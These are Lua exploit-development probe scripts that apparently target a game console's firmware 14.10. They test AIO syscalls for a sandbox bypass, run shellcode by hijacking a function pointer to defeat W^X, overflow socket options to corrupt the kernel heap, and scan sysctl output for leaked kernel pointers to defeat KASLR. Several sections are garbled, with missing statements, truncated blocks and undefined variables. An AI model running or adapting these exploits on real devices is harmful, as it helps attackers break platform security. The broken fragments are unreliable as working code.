## probes/phase10_untested_theories/43p_aio_bypass.lua

```lua
-- CRASH_CLASS: HIGH
-- PROBE 43p: AIO via make_syscall — test if AIO sandbox kill is in resolve() or kernel
--
-- Context:
-- Probes 19-19g confirmed all aio_* syscalls kill the process. BUT those probes used
-- syscall.resolve(), not make_syscall(). Probe 41w proved sysctl works through
-- make_syscall() while resolve() reports it blocked — the sandbox filter is Lua-side.
--
-- If AIO syscalls survive via make_syscall(), the entire AIO subsystem opens up and
-- race conditions become possible (AIO is inherently async — no threading needed).
--
-- The Relapse exploit (fw 7.00-13.60) used aio_multi_wait UAF. That specific bug is
-- patched in 14.00, but the bug CLASS (AIO race conditions) is only dead if AIO
-- itself is dead at the kernel level.
--
-- Strategy: Test each AIO syscall individually, safest first (aio_error/cancel),
-- dangerous last (aio_read/write). Each is wrapped in pcall. If ANY survive,
-- the sandbox kill is resolve()-side only and AIO races are alive on 14.10.

print("=== PROBE 43p: AIO BYPASS VIA MAKE_SYSCALL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- FreeBSD AIO syscall numbers
local AIO_SYSCALLS = {
    {num = 317, name = "aio_error",        desc = "Check AIO request status (safest)"},
    {num = 316, name = "aio_cancel",       desc = "Cancel AIO request"},
    {num = 314, name = "aio_return",       desc = "Return AIO completion status"},
    {num = 315, name = "aio_suspend",      desc = "Wait for AIO completion (may block)"},
    {num = 255, name = "aio_read",         desc = "Async read"},
    {num = 256, name = "aio_write",        desc = "Async write"},
    {num = 257, name = "lio_listio",       desc = "Batch AIO operations"},
    {num = 359, name = "aio_waitcomplete", desc = "Wait for any AIO completion"},
    {num = 465, name = "aio_fsync",        desc = "Async fsync"},
    {num = 543, name = "aio_mlock",        desc = "Async mlock"},
}

-- ============================================================
-- PHASE 1: Canary — verify make_syscall is working
-- ============================================================
print("--- PHASE 1: Canary (sysctl via make_syscall) ---")
local sc_sysctl = make_syscall(202)
local mib = memory.alloc(8)
safe_wd(mib, 1)
safe_wd(mib + 4, 4)
local cbuf = memory.alloc(256)
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 256)
local ok, ret = pcall(function()
    return sc_sysctl(uint64(mib), uint64(2), uint64(cbuf), uint64(oldlenp), uint64(0), uint64(0))
end)
if ok then
    print("  Canary OK: sysctl ret=" .. tostring(to_num(ret)))
else
    print("  CANARY FAILED — aborting")
    print("=== PROBE ABORTED ===")
    return
end
print("")

-- ============================================================
-- PHASE 2: Test each AIO syscall with NULL arguments
-- ============================================================
print("--- PHASE 2: AIO Syscall Survival Test (NULL args) ---")
print("If process dies here, the LAST printed syscall is the killer.")
print("")

local survived = {}
local killed = {}

for i, aio in ipairs(AIO_SYSCALLS) do
    print(string.format("  [%d/%d] %s (syscall %d) — %s",
        i, #AIO_SYSCALLS, aio.name, aio.num, aio.desc))

    local sc = make_syscall(aio.num)
    local test_ok, test_ret = pcall(function()
        return sc(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if test_ok then
        local rv = to_num(test_ret)
        local rv_signed = rv
        if rv >= 0x80000000 then rv_signed = rv - 0x100000000 end
        print(string.format("    SURVIVED! ret=%d (0x%X)", rv_signed, rv))
        table.insert(survived, {name = aio.name, num = aio.num, ret = rv_signed})
    else
        print(string.format("    pcall failed: %s", tostring(test_ret)))
        table.insert(killed, {name = aio.name, num = aio.num, err = tostring(test_ret)})
    end

    -- Post-test canary
    local alive_ok = pcall(function() return memory.read_dword(mib) end)
    if not alive_ok then
        print("    !!! POST-TEST CANARY FAILED — memory corrupted !!!")
        break
    end
end

print("")
print(string.format("=== AIO RESULTS: %d survived, %d failed ===", #survived, #killed))
print("")

if #survived > 0 then
    print("*** AIO SYSCALLS ALIVE VIA MAKE_SYSCALL ***")
    for _, s in ipairs(survived) do
        print(string.format("  %s (%d): ret=%d", s.name, s.num, s.ret))
    end
    print("")
    print("!!! CRITICAL: AIO sandbox kill is in resolve(), NOT the kernel !!!")
    print("!!! Race conditions via AIO are possible on fw 14.10 !!!")
end

if #killed > 0 then
    print("AIO syscalls that failed:")
    for _, k in ipairs(killed) do
        print(string.format("  %s (%d): %s", k.name, k.num, k.err))
    end
end
print("")

-- ============================================================
-- PHASE 3: If any AIO survived, test with real file descriptors
-- ============================================================
if #survived > 0 then
    print("--- PHASE 3: AIO Deep Test (real arguments) ---")
    print("")

    -- Open /dev/null for safe I/O testing
    local sc_open = make_syscall(5)
    local devnull_path = memory.alloc(16)
    safe_wd(devnull_path, 0x7665642F)
    safe_wd(devnull_path + 4, 0x6C756E2F)
    safe_wd(devnull_path + 8, 0x0000006C)
    local devnull_ok, devnull_ret = pcall(function()
        return sc_open(uint64(devnull_path), uint64(2), uint64(0))  -- O_RDWR
    end)
    local test_fd = -1
    if devnull_ok then
        test_fd = to_num(devnull_ret)
        print("  /dev/null fd=" .. test_fd)
    else
        print("  /dev/null open failed, using fd=3")
        test_fd = 3
    end

    -- Build aiocb (FreeBSD struct aiocb, ~168 bytes on amd64)
    local aiocb = memory.alloc(256)
    for j = 0, 248, 4 do safe_wd(aiocb + j, 0) end

    local aio_data = memory.alloc(256)
    for j = 0, 248, 4 do safe_wd(aio_data + j, 0) end

    safe_wd(aiocb, test_fd)                        -- +0x00: aio_fildes
    safe_wq(aiocb + 0x08, uint64(0))               -- +0x08: aio_offset = 0
    safe_wq(aiocb + 0x10, uint64(aio_data))        -- +0x10: aio_buf
    safe_wq(aiocb + 0x18, uint64(64))              -- +0x18: aio_nbytes = 64
    -- +0x30: aio_sigevent = SIGEV_NONE (0, already zeroed)

    -- Test survived syscalls with real args
    local has_read = false
    local has_write = false

    for _, s in ipairs(survived) do
        repeat
            if s.name == "aio_error" then
                print("  aio_error(aiocb)...")
                local ok2, ret2 = pcall(function()
                    return make_syscall(317)(uint64(aiocb))
                end)
                if ok2 then
                    print("    ret=" .. to_num(ret2))
                else
                    print("    failed: " .. tostring(ret2))
                end

            elseif s.name == "aio_cancel" then
                print("  aio_cancel(fd, aiocb)...")
                local ok2, ret2 = pcall(function()
                    return make_syscall(316)(uint64(test_fd), uint64(aiocb))
                end)
                if ok2 then
                    -- AIO_CANCELED=1, AIO_NOTCANCELED=2, AIO_ALLDONE=3
                    local rv = to_num(ret2)
                    print("    ret=" .. rv .. " (1=CANCELED, 2=NOTCANCELED, 3=ALLDONE)")
                else
                    print("    failed: " .. tostring(ret2))
                end

            elseif s.name == "aio_return" then
                print("  aio_return(aiocb)...")
                local ok2, ret2 = pcall(function()
                    return make_syscall(314)(uint64(aiocb))
                end)
                if ok2 then
                    print("    ret=" .. to_num(ret2))
                else
                    print("    failed: " .. tostring(ret2))
                end

            elseif s.name == "aio_read" then
                has_read = true
                print("  !!! aio_read(aiocb) — ASYNC READ TEST !!!")
                local ok2, ret2 = pcall(function()
                    return make_syscall(255)(uint64(aiocb))
                end)
                if ok2 then
                    local rv = to_num(ret2)
                    print("    ret=" .. rv)
                    if rv == 0 then

                        local err_ok, err_ret = pcall(function()
                            return make_syscall(317)(uint64(aiocb))
                        end)
                        if err_ok then
                            local ev = to_num(err_ret)
                            -- EINPROGRESS=36 on FreeBSD
                            print("    aio_error=" .. ev .. (ev == 36 and " (EINPROGRESS)" or ev == 0 and " (COMPLETED)" or ""))
                        end

                        local d0 = safe_rd(aio_data)
                        local d1 = safe_rd(aio_data + 4)

                safe_wd(aio_data, 0x41414141)
                safe_wd(aio_data + 4, 0x42424242)
                local ok2, ret2 = pcall(function()
                    return make_syscall(256)(uint64(aiocb))
                end)

                    print("    ret=" .. rv)

                -- Pass a zero timespec to avoid hanging
                local ts = memory.alloc(16)
                safe_wq(ts, uint64(0))      -- tv_sec = 0
                safe_wq(ts + 8, uint64(0))  -- tv_nsec = 0
                local aiocbp_out = memory.alloc(8)
                safe_wq(aiocbp_out, uint64(0))

                    return make_syscall(359)(uint64(aiocbp_out), uint64(ts))
                end)
                if ok2 then

                else

                local aiocb_list = memory.alloc(16)
                safe_wq(aiocb_list, uint64(aiocb))
                -- LIO_NOWAIT=1, set opcode in aiocb
                safe_wd(aiocb + 0x68, 1)  -- aio_lio_opcode = LIO_READ
                local ok2, ret2 = pcall(function()
                    return make_syscall(257)(uint64(1), uint64(aiocb_list), uint64(1), uint64(0))
                end)

    532, 533, 534, 535, 536, 537, 538, 539,
    620, 621, 622, 623, 624, 625, 626, 627, 628, 629,
    630, 631, 632, 633, 634, 635, 636, 637, 638, 639,
    640, 641, 642, 643, 644, 645, 646, 647, 648, 649,
    650, 651, 652, 653, 654, 655, 656, 657, 658, 659,
    660, 661, 662, 663, 664, 665, 666, 667, 668, 669,
    670, 671, 672, 673, 674, 675, 676, 677, 678, 679,
    680, 681, 682, 683, 684, 685, 686, 687, 688, 689,
    690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700,
}

local sony_live = {}
for _, snum in ipairs(sony_candidates) do
    local sc = make_syscall(snum)
    local ok2, ret2 = pcall(function()
        return sc(uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok2 then
        local rv = to_num(ret2)
        -- -1 = 0xFFFFFFFF (not found), anything else is interesting
        if rv ~= 4294967295 and rv ~= 0xFFFFFFFF then
            print(string.format("  *** LIVE: syscall %d returned %d (0x%X) ***", snum, rv, rv))
            table.insert(sony_live, {num = snum, ret = rv})
        end
    end
    -- Canary check every 20 syscalls
    if snum % 20 == 0 then
        local alive = pcall(function() return memory.read_dword(mib) end)
        if not alive then
            print("  !!! CANARY DEAD at syscall " .. snum .. " !!!")
            break
        end
    end
end

if #sony_live > 0 then
    print("")
    print("Sony live syscalls found in extended range:")
    for _, s in ipairs(sony_live) do
        print(string.format("  syscall %d: ret=%d", s.num, s.ret))
    end
    print("These need deeper investigation with AIO-style arguments!")
else
    print("  No additional live Sony syscalls found in 532-700 range")
end
print("")

-- ============================================================
-- PHASE 5: Summary
-- ============================================================
print("=== SUMMARY ===")
print(string.format("Standard AIO syscalls tested: %d", #AIO_SYSCALLS))
print(string.format("  Survived via make_syscall: %d", #survived))
print(string.format("  Failed/crashed: %d", #killed))
print(string.format("Sony extended range scanned: %d syscalls", #sony_candidates))
print(string.format("  Live: %d", #sony_live))
print("")

if #survived > 0 then
    print("BREAKTHROUGH: AIO is alive via make_syscall!")
    print("The resolve() sandbox was the only thing blocking AIO.")
    print("Race conditions via async I/O are now possible on fw 14.10.")
    print("")
    print("Implications:")
    print("  - aio_read/write create kernel worker threads internally")
    print("  - Concurrent kernel operations without userland threading")
    print("  - TOCTOU races on file descriptors become exploitable")
    print("  - The Relapse bug CLASS (AIO races) lives even if the specific bug is patched")
else
    print("AIO sandbox kill is kernel-enforced, not just resolve().")
    print("AIO is confirmed dead at the kernel level on fw 14.10.")
    print("Race conditions require a different path (ktimer signals, async socket I/O).")
end
print("")
print("=== PROBE 43p COMPLETE ===")
```

## probes/phase10_untested_theories/44a_mtypeprotect_exec.lua

```lua
-- CRASH_CLASS: HIGH (redirecting execution to shellcode page)
-- PROBE 44a: mtypeprotect + fn_addr execution test
--
-- 43h confirmed: mtypeprotect(585) returns ret=1 for RWX protection.
-- 43i confirmed: fn_addr writes persist across syscall calls.
-- This probe combines both: write shellcode to an mmap'd page,
-- call mtypeprotect to make it executable, then redirect fn_addr
-- to the shellcode page and trigger execution via a syscall call.
--
-- Shellcode strategy: simple "mov eax, 0x41414141; ret" — if eax
-- comes back as 0x41414141, we have arbitrary native code execution.
-- Also test: "mov eax, 20; syscall; ret" (getpid via direct syscall).
--
-- If this works: W^X is bypassed, no more ROP-only restriction.
-- We can then execute kernel info leak code directly.

print("=== PROBE 44a: MTYPEPROTECT EXECUTION TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Get fn_addr pointer from ROP chain
--------------------------------------------------------------------
print("")
print("=== A: LOCATE FN_ADDR ===")
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

if not fn_str then
    print("FATAL: cannot parse fn_addr from pipe string")
    return
end

local fn_ptr = uint64(fn_str)
print("fn_addr ptr: " .. fn_str)
print("ropchain: " .. (rop_str or "unknown"))

local fn_orig = safe_rq(fn_ptr)
if not fn_orig then
    print("FATAL: cannot read fn_addr")
    return
end
print("fn_addr original: " .. qw_hex(fn_orig))

--------------------------------------------------------------------
-- B) Allocate page and write shellcode
--------------------------------------------------------------------
print("")
print("=== B: SHELLCODE PAGE ===")
local page_size = 0x4000
local page
pcall(function()
    page = sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not page then
    print("FATAL: mmap failed")
    return
end
print("page addr: " .. qw_hex(page))

-- Shellcode 1: mov eax, 0x41414141; ret
-- B8 41 41 41 41 C3
memory.write_byte(page, 0xB8)
memory.write_byte(page + 1, 0x41)
memory.write_byte(page + 2, 0x41)
memory.write_byte(page + 3, 0x41)
memory.write_byte(page + 4, 0x41)
memory.write_byte(page + 5, 0xC3)
print("shellcode1 written: B8 41414141 C3 (mov eax,0x41414141; ret)")

-- Verify
local v = safe_rd(page)
print(string.format("verify: %08X", v or 0))

-- Shellcode 2 at page+0x100: xor eax,eax; mov al,20; ret
-- 31 C0 B0 14 C3
memory.write_byte(page + 0x100, 0x31)
memory.write_byte(page + 0x101, 0xC0)
memory.write_byte(page + 0x102, 0xB0)
memory.write_byte(page + 0x103, 0x14)
memory.write_byte(page + 0x104, 0xC3)
print("shellcode2 at +0x100: 31C0 B014 C3 (xor eax,eax; mov al,20; ret)")

-- Shellcode 3 at page+0x200: nop sled + ret (safe test)
-- 90 90 90 90 C3
for i = 0, 15 do
    memory.write_byte(page + 0x200 + i, 0x90)
end
memory.write_byte(page + 0x210, 0xC3)
print("shellcode3 at +0x200: NOP sled + ret (safest test)")

--------------------------------------------------------------------
-- C) Call mtypeprotect to make page executable
--------------------------------------------------------------------
print("")
print("=== C: MTYPEPROTECT TO RWX ===")

-- Try 3-arg form: mtypeprotect(addr, len, prot=RWX=7)
local ok, ret = pcall(function()
    return sc_mtypeprotect(uint64(page), uint64(page_size), uint64(7))
end)
local rv = ok and to_num(ret) or -999
print(string.format("mtypeprotect(RWX, 3-arg): ret=%d", rv))

-- Also try 4-arg form: mtypeprotect(addr, len, old=3, new=7)
ok, ret = pcall(function()
    return sc_mtypeprotect(uint64(page), uint64(page_size), uint64(3), uint64(7))
end)
rv = ok and to_num(ret) or -999
print(string.format("mtypeprotect(RW->RWX, 4-arg): ret=%d", rv))

-- Verify page is still readable/writable after mtypeprotect
local still_readable = safe_rd(page)
print(string.format("still readable: %s", still_readable and "YES" or "NO"))
local still_writable = safe_wd(page + 0x300, 0xBEEF)
print(string.format("still writable: %s", still_writable and "YES" or "NO"))

--------------------------------------------------------------------
-- D) EXECUTION TEST 1: NOP sled (safest)
--------------------------------------------------------------------
print("")
print("=== D: EXECUTION TEST 1 - NOP SLED ===")
print("redirecting fn_addr to NOP sled at page+0x200...")

-- Save original, write shellcode address
safe_wq(fn_ptr, page + 0x200)

-- Verify the write
local fn_check = safe_rq(fn_ptr)
print("fn_addr now: " .. qw_hex(fn_check))

-- Try calling getpid - if page is executable, NOP sled runs and returns
local exec_ok, exec_ret = pcall(function()
    return sc_getpid()
end)
local exec_rv = exec_ok and to_num(exec_ret) or -999
print(string.format("nop_sled result: ok=%s ret=%d (0x%X)", tostring(exec_ok), exec_rv, exec_rv >= 0 and exec_rv or 0))

if exec_ok then
    print("*** PAGE IS EXECUTABLE! NOP SLED SURVIVED! ***")

    -- Restore fn_addr for next test
    safe_wq(fn_ptr, fn_orig)

    ----------------------------------------------------------------
    -- E) EXECUTION TEST 2: mov eax, 0x41414141; ret
    ----------------------------------------------------------------
    print("")
    print("=== E: EXECUTION TEST 2 - MOV EAX ===")
    safe_wq(fn_ptr, page)
    local ok2, ret2 = pcall(function()
        return sc_getpid()
    end)
    local rv2 = ok2 and to_num(ret2) or -999
    print(string.format("mov_eax result: ok=%s ret=%d (0x%X)", tostring(ok2), rv2, rv2 >= 0 and rv2 or 0))

    if ok2 and rv2 == 0x41414141 then
        print("*** ARBITRARY NATIVE CODE EXECUTION CONFIRMED ***")
        print("*** W^X IS COMPLETELY BYPASSED ***")
    elseif ok2 then
        print("executed but unexpected return value")
    end

    -- Restore
    safe_wq(fn_ptr, fn_orig)

    ----------------------------------------------------------------
    -- F) EXECUTION TEST 3: actual getpid syscall from shellcode
    ----------------------------------------------------------------
    print("")
    print("=== F: EXECUTION TEST 3 - DIRECT SYSCALL ===")

    -- Write: mov eax, 20; syscall; ret
    -- B8 14 00 00 00 0F 05 C3
    memory.write_byte(page + 0x400, 0xB8)
    memory.write_byte(page + 0x401, 0x14)
    memory.write_byte(page + 0x402, 0x00)
    memory.write_byte(page + 0x403, 0x00)
    memory.write_byte(page + 0x404, 0x00)
    memory.write_byte(page + 0x405, 0x0F)
    memory.write_byte(page + 0x406, 0x05)
    memory.write_byte(page + 0x407, 0xC3)

    safe_wq(fn_ptr, page + 0x400)
    local ok3, ret3 = pcall(function()
        return sc_getpid()
    end)
    local rv3 = ok3 and to_num(ret3) or -999
    print(string.format("syscall result: ok=%s ret=%d", tostring(ok3), rv3))

    if ok3 and rv3 == pid then
        print("*** DIRECT SYSCALL EXECUTION WORKS ***")
        print("*** CAN NOW EXECUTE ANY SYSCALL WITHOUT ROP ***")
    elseif ok3 then
        print(string.format("returned %d, expected pid=%d", rv3, pid))
    end

    safe_wq(fn_ptr, fn_orig)
else
    print("execution CRASHED - page not executable (mtypeprotect did not work)")
    print("crash is expected if mtypeprotect only changes type metadata, not actual MMU flags")
end

--------------------------------------------------------------------
-- G) Restore and cleanup
--------------------------------------------------------------------
print("")
print("=== G: CLEANUP ===")
-- Make sure fn_addr is restored
safe_wq(fn_ptr, fn_orig)
local fn_final = safe_rq(fn_ptr)
print("fn_addr restored: " .. qw_hex(fn_final))

-- Verify getpid still works
local ok_final, ret_final = pcall(function() return sc_getpid() end)
print(string.format("getpid after restore: ok=%s ret=%d", tostring(ok_final), ok_final and to_num(ret_final) or -999))

pcall(function() sc_munmap(page, uint64(page_size)) end)

print("")
print("=== PROBE 44a COMPLETE ===")
```

## probes/phase10_untested_theories/44c_sockopt_heap_corrupt.lua

```lua
-- CRASH_CLASS: HIGH (potential kernel heap corruption)
-- PROBE 44c: Socket option kernel heap overflow exploitation
--
-- 43m confirmed: setsockopt accepts buffers up to 4096 bytes for options

-- into a smaller kernel allocation, this is a kernel heap overflow.

--   1. Write a recognizable pattern via oversized setsockopt
--   2. Allocate adjacent kernel objects (sockets, pipes, ktimers)
--   3. Check if adjacent objects are corrupted
--   4. If corruption confirmed: controlled kernel heap write primitive

-- since we corrupt adjacent objects at unknown but consistent offsets.

    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)

end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))

local sc_getpid = make_syscall(20)

local sc_setsockopt = make_syscall(105)

--------------------------------------------------------------------

print("=== D: BASELINE STATE ===")

for i, fd in ipairs(post_socks) do

--------------------------------------------------------------------

for _, sz in ipairs(sizes) do
    -- Set the option with oversized buffer
    local ok, ret = pcall(function()
        return sc_setsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x2000),
            uint64(overflow_buf), uint64(sz))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  setsockopt(0x2000, len=%d): ret=%d", sz, rv))

    if rv == -999 then
        print("  CRASHED at size " .. sz)
        break
    end

    local corrupted = 0
    for j, b in ipairs(baseline) do
        local rbuf = memory.alloc(256)
        local rlenp = memory.alloc(8)
        safe_wd(rlenp, 256)
        local ok2, ret2 = pcall(function()
            return sc_getsockopt(uint64(b.fd), uint64(0xFFFF), uint64(0x1001),
                uint64(rbuf), uint64(rlenp))
        end)
        if not ok2 then
            print(string.format("  *** fd=%d: getsockopt CRASHED (CORRUPTED!) ***", b.fd))
            corrupted = corrupted + 1
        else

            if new_val ~= b.sndbuf then
                print(string.format("  *** fd=%d: SO_SNDBUF changed %d -> %d (CORRUPTED!) ***",
                    b.fd, b.sndbuf or -1, new_val or -1))
                corrupted = corrupted + 1
            end
        end
    end

    if corrupted > 0 then
        print(string.format("  *** %d SOCKETS CORRUPTED at size %d ***", corrupted, sz))
        print("  *** KERNEL HEAP OVERFLOW CONFIRMED ***")
        break
    else

-- F) Try different options that might have different backing sizes
--------------------------------------------------------------------
print("")
print("=== F: OTHER OPTIONS (SO_SNDBUF, SO_RCVBUF) ===")

-- SO_SNDBUF (0x1001) is an int — writing 4096 bytes to a 4-byte field

local ok, ret = pcall(function()
    return sc_setsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x1001),
        uint64(overflow_buf), uint64(2048))
end)
local rv = ok and to_num(ret) or -999
print(string.format("SO_SNDBUF(len=2048): ret=%d", rv))

-- Read it back
local rbuf = memory.alloc(256)
local rlenp = memory.alloc(8)
safe_wd(rlenp, 256)
ok, ret = pcall(function()
    return sc_getsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x1001),
        uint64(rbuf), uint64(rlenp))
end)
rv = ok and to_num(ret) or -999
local rlen = safe_rd(rlenp) or 0
print(string.format("SO_SNDBUF readback: ret=%d rlen=%d val=%d", rv, rlen, safe_rd(rbuf) or -1))

-- SO_RCVBUF (0x1002)
ok, ret = pcall(function()
    return sc_setsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x1002),
        uint64(overflow_buf), uint64(2048))
end)
rv = ok and to_num(ret) or -999
print(string.format("SO_RCVBUF(len=2048): ret=%d", rv))

--------------------------------------------------------------------
-- G) Check for any kernel pointer leaks in readback
--------------------------------------------------------------------
print("")
print("=== G: SCAN READBACK FOR KERNEL POINTERS ===")
-- Read back with large buffer to see if kernel leaks extra data
local big_rbuf = memory.alloc(4096)
for i = 0, 1023 do safe_wd(big_rbuf + i*4, 0xAAAAAAAA) end

safe_wd(rlenp, 4096)
ok, ret = pcall(function()
    return sc_getsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x2000),
        uint64(big_rbuf), uint64(rlenp))
end)
rv = ok and to_num(ret) or -999
rlen = safe_rd(rlenp) or 0
print(string.format("getsockopt(0x2000, len=4096): ret=%d rlen=%d", rv, rlen))

-- Scan returned data for kernel pointers
if rlen > 4 then
    print("extra data returned! scanning...")
    for i = 0, math.min(rlen/4, 255) do
        local lo = safe_rd(big_rbuf + i*8)
        local hi = safe_rd(big_rbuf + i*8 + 4)
        if hi and hi >= 0xFFFF8000 then
            print(string.format("  *** KERNEL POINTER at +%03X: %08X_%08X ***", i*8, hi, lo or 0))
        end
    end
end

-- Also check if 0xAAAAAAAA pattern was overwritten beyond rlen
local leaked = 0
for i = 0, 63 do
    local v = safe_rd(big_rbuf + rlen + i*4)
    if v and v ~= 0xAAAAAAAA then
        print(string.format("  data beyond rlen at +%03X: %08X", rlen + i*4, v))
        leaked = leaked + 1
    end
end
if leaked > 0 then
    print(string.format("  %d dwords modified beyond rlen!", leaked))
end

--------------------------------------------------------------------
-- H) Cleanup
--------------------------------------------------------------------
print("")
print("=== H: CLEANUP ===")
for _, fd in ipairs(post_socks) do pcall(function() sc_close(uint64(fd)) end) end
pcall(function() sc_close(uint64(target_fd)) end)
for _, fd in ipairs(pre_socks) do pcall(function() sc_close(uint64(fd)) end) end
```

```lua
-- CRASH_CLASS: MODERATE (creative KASLR approaches)
-- PROBE 44d: Creative KASLR defeat — alternative approaches
--
-- All direct info leak paths are dead (kldstat, kldsym, AF_ROUTE, kinfo_proc,
-- gsbase, msgbuf). This probe tries unconventional approaches:
--
-- 1. sysctl kern.proc.pathname — might leak kernel vnode pointers
-- 2. sysctl kern.proc.groups — might have kernel addresses in padding
-- 3. sysctl kern.proc.rlimit — resource limits with kernel metadata
-- 4. NET_RT_IFLIST — network interface list (different from AF_ROUTE)
-- 5. Timing oracle — measure syscall timing to narrow KASLR range
-- 6. kern.proc.env — environment variables (may contain kernel paths)
-- 7. sigaction readback — signal handler structs might leak kernel addrs

print("=== PROBE 44d: CREATIVE KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)
local sc_mmap = make_syscall(477)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local function try_sysctl(name, mib, miblen, bufsize)
    print(string.format("--- %s (MIB={%s}, bufsize=%d) ---", name,
        table.concat(mib, ","), bufsize))
    local mib_buf = memory.alloc(miblen * 4)
    for i, v in ipairs(mib) do safe_wd(mib_buf + (i-1)*4, v) end
    local outbuf = memory.alloc(bufsize)
    for i = 0, math.min(bufsize/4, 255) - 1 do safe_wd(outbuf + i*4, 0xAAAAAAAA) end
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, bufsize)

    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib_buf), uint64(miblen), uint64(outbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local actual_len = safe_rd(oldlenp) or 0
    print(string.format("  ret=%d  actual_len=%d", rv, actual_len))

    if rv == 0 and actual_len > 0 then
        -- Scan for kernel pointers
        local kptrs = 0
        local max_scan = math.min(actual_len, bufsize)
        for off = 0, max_scan - 8, 8 do
            local lo = safe_rd(outbuf + off) or 0
            local hi = safe_rd(outbuf + off + 4) or 0
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                print(string.format("  *** KPTR at +%03X: %08X_%08X ***", off, hi, lo))
                kptrs = kptrs + 1
            end
        end

        -- Print first 64 bytes regardless
        local bytes_to_show = math.min(actual_len, 64)
        local hex_line = "  data: "
        for i = 0, bytes_to_show - 1, 4 do
            local v = safe_rd(outbuf + i)
            hex_line = hex_line .. string.format("%08X ", v or 0)
            if (i + 4) % 32 == 0 and i + 4 < bytes_to_show then
                print(hex_line)
                hex_line = "        "
            end
        end
        if #hex_line > 8 then print(hex_line) end

        if kptrs == 0 then print("  no kernel pointers") end
        return actual_len
    elseif rv == -999 then
        print("  CRASHED")
    else
        print("  blocked or empty")
    end
    return 0
end

--------------------------------------------------------------------
-- A) kern.proc.pathname (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_PATHNAME=12, pid)
--------------------------------------------------------------------
print("")
print("=== A: KERN.PROC.PATHNAME ===")
try_sysctl("kern.proc.pathname", {1, 14, 12, pid}, 4, 1024)
